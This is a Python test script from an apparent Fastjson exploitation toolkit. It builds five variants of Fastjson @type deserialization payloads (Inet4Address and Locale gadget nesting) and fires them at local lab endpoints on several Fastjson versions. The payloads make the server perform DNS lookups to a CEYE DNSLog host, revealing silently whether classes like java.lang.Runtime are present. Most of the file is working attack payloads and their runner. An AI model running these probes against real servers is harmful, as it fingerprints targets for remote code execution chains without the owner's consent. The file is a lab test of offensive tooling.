"""Test silent (no-error-echo) Fastjson dependency probes via DNSLog/CEYE."""

from __future__ import annotations

import time
from dataclasses import dataclass

from fastjson_toolkit.config import load_dotenv
from fastjson_toolkit.deps.probes import character_payload
from fastjson_toolkit.dnslog import CeyeClient, CeyeConfig, CeyeRecord
from fastjson_toolkit.http.client import HttpClient

# Present vs absent classes for discrimination.
CLASS_PRESENT = "java.lang.Runtime"
CLASS_ABSENT = "groovy.lang.GroovyShell"

# Focused matrix: default + autotype across milestone versions.
TARGETS = [
    ("1.2.83", "http://127.0.0.1:18080/api/fastjson"),
    ("1.2.83-at", "http://127.0.0.1:18080/api/fastjson/autotype"),
    ("1.2.80-at", "http://127.0.0.1:18082/api/fastjson/autotype"),
    ("1.2.68-at", "http://127.0.0.1:18068/api/fastjson/autotype"),
    ("1.2.47", "http://127.0.0.1:18047/api/fastjson"),
    ("1.2.47-at", "http://127.0.0.1:18047/api/fastjson/autotype"),
    ("1.2.30", "http://127.0.0.1:18030/api/fastjson"),
]


def wait_dns_resilient(
    ceye: CeyeClient, filt: str, *, timeout: float = 10.0
) -> list[CeyeRecord]:
    """Poll CEYE with retries on transient 5xx."""
    deadline = time.time() + timeout
    last: list[CeyeRecord] = []
    while time.time() < deadline:
        try:
            last = ceye.query("dns", filt)
            if last:
                # settle a bit for late records
                time.sleep(1.5)
                try:
                    last = ceye.query("dns", filt)
                except Exception:
                    pass
                return last
        except Exception as exc:  # noqa: BLE001
            print(f"  CEYE poll retry: {type(exc).__name__}")
        time.sleep(1.2)
    return last


@dataclass(frozen=True)
class ProbeVariant:
    id: str
    description: str

    def build(self, clazz: str, dns_host: str) -> str:
        raise NotImplementedError


class NestedLocaleInet4(ProbeVariant):
    """safe6 / 网传嵌套 Locale → Inet4 country."""

    def __init__(self) -> None:
        super().__init__(
            "nested_locale_inet4",
            "嵌套 Locale+Class，country 作 DNS（safe6 网传）",
        )

    def build(self, clazz: str, dns_host: str) -> str:
        return (
            '{"@type":"java.net.Inet4Address",'
            '"val":{"@type":"java.lang.String"'
            '{"@type":"java.util.Locale",'
            '"val":{"@type":"com.alibaba.fastjson.JSONObject",{'
            '"@type":"java.lang.String""@type":"java.util.Locale",'
            '"language":{"@type":"java.lang.String"'
            '{1:{"@type":"java.lang.Class","val":"' + clazz + '"}},'
            '"country":"' + dns_host + '"}}}}'
        )


class NestedLocaleInet4Alt(ProbeVariant):
    """妙尽璇机简化嵌套：去掉 JSONObject 层。"""

    def __init__(self) -> None:
        super().__init__(
            "nested_locale_inet4_alt",
            "嵌套 Locale+Class（无 JSONObject 层）",
        )

    def build(self, clazz: str, dns_host: str) -> str:
        return (
            '{"@type":"java.net.Inet4Address","val":{'
            '"@type":"java.lang.String"{"@type":"java.util.Locale","val":{'
            '"language":{"@type":"java.lang.String"'
            '{"1":{"@type":"java.lang.Class","val":"' + clazz + '"}},'
            '"country":"' + dns_host + '"}}}}'
        )


class SplitLocaleThenInet4(ProbeVariant):
    """妙尽璇机 a/b：Locale/Class 成功后才解析 b 的 Inet4。"""

    def __init__(self) -> None:
        super().__init__(
            "split_locale_then_inet4",
            "a=Locale+Class, b=Inet4Address（拆分）",
        )

    def build(self, clazz: str, dns_host: str) -> str:
        return (
            '{"a":{"@type":"java.util.Locale","val":{'
            '"@type":"java.lang.String"{"@type":"java.util.Locale","val":{'
            '"language":{"@type":"java.lang.String"'
            '{"@type":"java.lang.Class","val":"' + clazz + '"},'
            '"country":"CN"}}}},'
            '"b":{"@type":"java.net.Inet4Address","val":"' + dns_host + '"}}'
        )


class WhoopsunixLocaleDns(ProbeVariant):
    """Whoopsunix 文档变体：Class 放在 language 的 x 字段。"""

    def __init__(self) -> None:
        super().__init__(
            "whoopsunix_locale_dns",
            "Whoopsunix Locale language.x=Class + country=DNS",
        )

    def build(self, clazz: str, dns_host: str) -> str:
        return (
            '{"@type":"java.net.Inet4Address","val":{'
            '"@type":"java.lang.String"{"@type":"java.util.Locale","val":{'
            '"@type":"com.alibaba.fastjson.JSONObject",{'
            '"@type":"java.lang.String""@type":"java.util.Locale",'
            '"country":"' + dns_host + '",'
            '"language":{"@type":"java.lang.String"'
            '{"x":{"@type":"java.lang.Class","val":"' + clazz + '"}}}}}}'
        )


class LocaleOnlyThenSeparateDns(ProbeVariant):
    """两步：先发 Locale+Class，再发独立 Inet4；仅作对照（无法严格证明依赖）。"""

    def __init__(self) -> None:
        super().__init__(
            "locale_only_then_dns",
            "两步对照：Locale+Class 后再发独立 Inet4（弱证明）",
        )

    def build(self, clazz: str, dns_host: str) -> str:
        # Primary payload is Locale; DNS sent separately in runner for this id.
        return (
            '{"@type":"java.util.Locale","val":{'
            '"@type":"java.lang.String"{"@type":"java.util.Locale","val":{'
            '"language":{"@type":"java.lang.String"'
            '{"@type":"java.lang.Class","val":"' + clazz + '"},'
            '"country":"CN"}}}}'
        )


VARIANTS: list[ProbeVariant] = [
    NestedLocaleInet4(),
    NestedLocaleInet4Alt(),
    SplitLocaleThenInet4(),
    WhoopsunixLocaleDns(),
    LocaleOnlyThenSeparateDns(),
]


def _excerpt(text: str, n: int = 100) -> str:
    return (text or "").replace("\r", " ").replace("\n", " ")[:n]


def main() -> None:
    load_dotenv()
    cfg = CeyeConfig.from_env()
    if cfg is None:
        print("CEYE not configured; abort.")
        return

    ceye = CeyeClient(cfg)
    client = HttpClient(timeout=8.0)

    # Outbound sanity.
    filt = CeyeClient.new_filter("bl")
    host = ceye.build_host(filt)
    baseline = '{"@type":"java.net.Inet4Address","val":"' + host + '"}'
    print("=== BASELINE Inet4 ===")
    for name, url in TARGETS:
        if name not in ("1.2.47", "1.2.30", "1.2.83-at"):
            continue
        r = client.post_raw(url, baseline)
        print(f"{name:10} status={r.status_code} ms={r.elapsed_ms:.0f}")
    recs = wait_dns_resilient(ceye, filt, timeout=12.0)
    print(f"baseline DNS={len(recs)} -> {[r.name for r in recs[:3]]}")
    if not recs:
        print("Baseline DNS failed; stop.")
        ceye.close()
        client.close()
        return

    # Character control (echo path) — only key endpoints.
    print("\n=== Character control ===")
    for clazz in (CLASS_PRESENT, CLASS_ABSENT):
        body = character_payload(clazz)
        print(f"-- {clazz} --")
        for name, url in TARGETS:
            if name not in ("1.2.83", "1.2.83-at", "1.2.47"):
                continue
            r = client.post_raw(url, body)
            cast = "can not cast to char" in (r.text or "").lower()
            print(
                f"{name:10} cast={cast} status={r.status_code} {_excerpt(r.text, 80)}"
            )

    summary: list[tuple[str, str, str, int]] = []

    for variant in VARIANTS:
        for clazz, expect in (
            (CLASS_PRESENT, "expect_dns_if_works"),
            (CLASS_ABSENT, "expect_no_dns_if_works"),
        ):
            filt = CeyeClient.new_filter("dp")
            dns_host = ceye.build_host(filt)
            payload = variant.build(clazz, dns_host)
            print("\n" + "=" * 72)
            print(f"VARIANT={variant.id} | {variant.description}")
            print(f"CLASS={clazz} ({expect})")
            print(f"host={dns_host} filter={filt}")

            for name, url in TARGETS:
                try:
                    r = client.post_raw(url, payload)
                    print(
                        f"{name:10} status={r.status_code} ms={r.elapsed_ms:.0f} "
                        f"{_excerpt(r.text)}"
                    )
                except Exception as exc:  # noqa: BLE001
                    print(f"{name:10} ERR {exc}")

            # Weak two-step: after Locale, send independent Inet4 on same filter host.
            if variant.id == "locale_only_then_dns":
                dns_payload = '{"@type":"java.net.Inet4Address","val":"' + dns_host + '"}'
                print("--- follow-up plain Inet4 ---")
                for name, url in TARGETS:
                    if name not in ("1.2.47", "1.2.30", "1.2.83-at"):
                        continue
                    r = client.post_raw(url, dns_payload)
                    print(f"{name:10} status={r.status_code} ms={r.elapsed_ms:.0f}")

            print("Waiting CEYE...")
            recs = wait_dns_resilient(ceye, filt, timeout=10.0)
            print(f"DNS records={len(recs)}")
            for row in recs[:8]:
                print(f" - {row.name}")
            summary.append((variant.id, clazz, expect, len(recs)))

    print("\n" + "=" * 72)
    print("SUMMARY (dns_count)")
    print(f"{'variant':28} {'class':28} {'expect':22} dns")
    for vid, clazz, expect, n in summary:
        short = clazz.rsplit(".", 1)[-1]
        print(f"{vid:28} {short:28} {expect:22} {n}")

    print(
        "\nInterpretation:\n"
        "- Useful silent dep probe: present class -> dns>0 AND absent class -> dns==0\n"
        "- If both 0: chain does not fire on this lab\n"
        "- If both >0: DNS not gated by Class (false positive)\n"
        "- locale_only_then_dns both>0 is expected (weak / not dependency-gated)"
    )

    ceye.close()
    client.close()


if __name__ == "__main__":
    main()
